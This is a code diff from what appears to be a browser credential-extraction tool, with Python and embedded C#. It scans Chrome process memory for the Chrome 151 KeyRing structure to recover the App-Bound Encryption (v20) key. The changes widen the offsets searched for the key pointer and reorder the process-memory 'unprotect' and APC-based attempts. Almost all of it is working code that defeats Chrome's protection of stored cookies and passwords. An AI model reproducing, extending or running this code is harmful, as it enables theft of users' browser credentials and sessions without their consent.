@@ -3336,29 +3336,32 @@ def _high_entropy32(buf: bytes) -> bool:
     return len(buf) == 32 and len(set(buf)) >= 12
 
 
-# Encryptor::KeyRing node: SSO tag `v20\0` + algorithm_ + key_.begin at +32.
-# Fingerprint: 76 32 30 00 ??*19 03 00 00 00 00 01 ??*3
+# Encryptor::KeyRing is map<string, optional<Key>>. string is 24-byte SSO.
+# Key = optional<Algorithm> + vector key_ + bool. key_.begin is at +32 or +40.
 _KEYRING_V20_MARK = b"\x03\x00\x00\x00\x00\x01"
+_KEYRING_VEC_OFFS = (32, 40, 48)
 
 
-def _vector32_at(buf: bytes, base: int) -> int | None:
-    """key_.begin if [base+32] is a 32-byte libc++ vector."""
-    if base < 0 or base + 40 > len(buf):
+def _vector32_at(buf: bytes, base: int, off: int = 32) -> int | None:
+    """key_.begin if [base+off] is a 32-byte libc++ vector (begin/end)."""
+    if base < 0 or base + off + 16 > len(buf):
         return None
-    begin = int.from_bytes(buf[base + 32 : base + 40], "little")
-    if not _looks_like_user_ptr(begin):
-        return None
-    if base + 48 <= len(buf):
-        finish = int.from_bytes(buf[base + 40 : base + 48], "little")
-        if finish == begin + 32:
-            return _canonical_ptr(begin)
-    if base + 29 <= len(buf) and buf[base + 23 : base + 29] == _KEYRING_V20_MARK:
+    begin = int.from_bytes(buf[base + off : base + off + 8], "little")
+    finish = int.from_bytes(buf[base + off + 8 : base + off + 16], "little")
+    if _looks_like_user_ptr(begin) and finish == begin + 32:
+        return _canonical_ptr(begin)
+    if (
+        off == 32
+        and base + 29 <= len(buf)
+        and buf[base + 23 : base + 29] == _KEYRING_V20_MARK
+        and _looks_like_user_ptr(begin)
+    ):
         return _canonical_ptr(begin)
     return None
 
 
 def _keyring_v20_key_ptrs(buf: bytes) -> list[int]:
-    """key_.begin from a Chrome 151 KeyRing `v20` node (data-first or size-first SSO)."""
+    """key_.begin from a Chrome 151 KeyRing `v20` node (SSO + optional<Key>)."""
     out: list[int] = []
     start = 0
     while True:
@@ -3373,9 +3376,10 @@ def _keyring_v20_key_ptrs(buf: bytes) -> list[int]:
         if aligned not in bases:
             bases.append(aligned)
         for base in bases:
-            ptr = _vector32_at(buf, base)
-            if ptr is not None:
-                out.append(ptr)
+            for off in _KEYRING_VEC_OFFS:
+                ptr = _vector32_at(buf, base, off)
+                if ptr is not None:
+                    out.append(ptr)
     return out
 
 
@@ -3867,13 +3871,13 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
         if _v20_key_ok(cand, v20_sample):
             return cand
         if unprotect is not None and unprotect.ok:
-            plain = unprotect.unprotect(cand)
-            if _v20_key_ok(plain, v20_sample):
-                return plain
             if addr:
                 plain = unprotect.unprotect_at(addr)
                 if _v20_key_ok(plain, v20_sample):
                     return plain
+            plain = unprotect.unprotect(cand)
+            if _v20_key_ok(plain, v20_sample):
+                return plain
         return None
 
     for pid in pids:
@@ -3951,11 +3955,12 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
         return None, "memscan:OpenProcess"
     if tried == 0:
         return None, "memscan:no_cand"
-    extra = ""
     if not unprotect_ok:
-        extra = ";unprotect:0"
+        extra = ";apc:setup"
     elif apc_changed == 0:
         extra = ";apc:0"
+    else:
+        extra = f";apc:{apc_changed}"
     return None, f"memscan:no_key:{tried}{extra}"
 
 
@@ -4447,13 +4452,17 @@ class K {
               int[] bases = (i > 0) ? new int[] { i, i - 1, i & ~7 } : new int[] { i, i & ~7 };
               foreach (int b in bases) {
                 if (b < 0 || b + 40 > read) continue;
-                ulong begin = BitConverter.ToUInt64(buf, b + 32);
-                if (!UserPtr(begin)) continue;
-                bool marked = b + 29 <= read && buf[b+23] == 3 && buf[b+24] == 0 && buf[b+25] == 0
-                  && buf[b+26] == 0 && buf[b+27] == 0 && buf[b+28] == 1;
-                bool vec = b + 48 <= read && BitConverter.ToUInt64(buf, b + 40) == begin + 32UL;
-                if (marked || vec)
-                  TryKey(ReadN(h, begin, 32), found, seen, h, data, unprotect, alert);
+                int[] offs = new int[] { 32, 40, 48 };
+                foreach (int off in offs) {
+                  if (b + off + 16 > read) continue;
+                  ulong begin = BitConverter.ToUInt64(buf, b + off);
+                  if (!UserPtr(begin)) continue;
+                  ulong finish = BitConverter.ToUInt64(buf, b + off + 8);
+                  bool marked = off == 32 && b + 29 <= read && buf[b+23] == 3 && buf[b+24] == 0
+                    && buf[b+25] == 0 && buf[b+26] == 0 && buf[b+27] == 0 && buf[b+28] == 1;
+                  if (marked || finish == begin + 32UL)
+                    TryKey(ReadN(h, begin, 32), found, seen, h, data, unprotect, alert);
+                }
               }
             }
             for (int i = 0; i + 24 <= read && found.Count < MAX_CAND; i += 8) {
